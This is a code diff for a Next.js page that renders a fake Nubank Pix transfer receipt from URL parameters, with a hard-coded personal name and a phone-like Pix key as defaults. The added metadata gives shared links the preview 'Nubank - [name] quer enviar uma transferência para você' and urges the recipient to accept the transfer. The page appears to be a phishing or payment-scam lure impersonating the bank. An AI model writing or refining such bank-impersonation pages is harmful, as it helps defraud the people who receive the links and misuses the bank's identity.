@@ -2,12 +2,19 @@ import { Card } from '../../components/ui/card'
 import { Button } from '../../components/ui/button'
 import { AddIcon } from '@/icons'
 import { formatToBRL, getFirstName, getRelativeTimeLabel, maskCPF } from '@/helpers'
+import { SearchParams } from 'next/dist/server/request/search-params'
 
-export default function Comprovante({
-  searchParams,
-}: {
-  searchParams: { [key: string]: string | string[] | undefined }
-}) {
+export async function generateMetadata({ searchParams }: { searchParams: SearchParams }) {
+  const origemNome = (searchParams['origem_nome'] as string) || 'Maria Luiza Marques Salles'
+  const destinoNome = (searchParams['destino_nome'] as string) || 'Mirella'
+  const firstName = getFirstName(origemNome)
+  return {
+    title: `Nubank - ${firstName} quer enviar uma transferência para você`,
+    description: `Aceite a transferência de forma rápida e segura do ${firstName} através da Nubank!`,
+  }
+}
+
+export default function Comprovante({ searchParams }: { searchParams: SearchParams }) {
   // Captura dos parâmetros
   const valor = (searchParams['valor'] as string) || '492,00'
   const pixKey = (searchParams['pix'] as string) || '11978452751'
@@ -51,7 +58,7 @@ export default function Comprovante({
         </div>
 
         {/* Card estilo ticket */}
-        <div className="relative my-8 flex justify-center overflow-hidden">
+        <div className="relative my-4 flex justify-center overflow-hidden">
           {/* Semicírculo esquerdo */}
           <div className="absolute left-0 top-1/2 translate-y-5 -translate-x-1/2 w-6 h-6 bg-white rounded-full border border-gray-200 z-10"></div>
           {/* Semicírculo direito */}
